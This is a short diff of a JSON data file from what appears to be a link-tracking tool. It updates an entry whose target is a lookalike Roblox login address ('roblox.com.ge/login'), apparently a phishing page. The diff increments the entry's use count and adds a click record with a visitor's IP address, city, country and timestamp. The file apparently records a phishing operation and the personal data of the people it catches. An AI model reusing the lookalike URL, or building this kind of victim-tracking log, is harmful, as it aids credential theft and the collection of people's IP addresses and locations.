@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1713,
+    "useCount": 1714,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13872,6 +13872,14 @@
         "city": "Miami",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777687134198,
+        "ip": "186.7.223.118",
+        "country": "Dominican Republic",
+        "city": "Santiago de los Caballeros",
+        "flag": "🇩🇴",
+        "countryCode": "DO"
       }
     ]
   },
